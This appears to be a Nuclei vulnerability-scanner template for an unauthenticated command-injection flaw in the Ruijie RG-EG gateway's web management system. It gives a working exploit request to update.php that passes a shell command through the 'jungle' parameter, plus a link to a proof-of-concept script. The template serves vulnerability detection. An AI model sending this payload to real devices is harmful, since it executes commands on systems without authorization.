# Nuclei Template: Ruijie RG-EG - Remote Code Execution
**Template ID:** ruijie-rg-eg-web-mis-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`ruijie-rg-eg-web-mis-rce.yaml`)

## Vulnerability Information & PoC

## Description
Ruijie RG-EG easy gateway WEB management system front-end RCE has a command execution vulnerability. An attacker without identity authentication can execute arbitrary commands to control server permissions.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/update.php?jungle=id
```

## References
- https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_WEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py
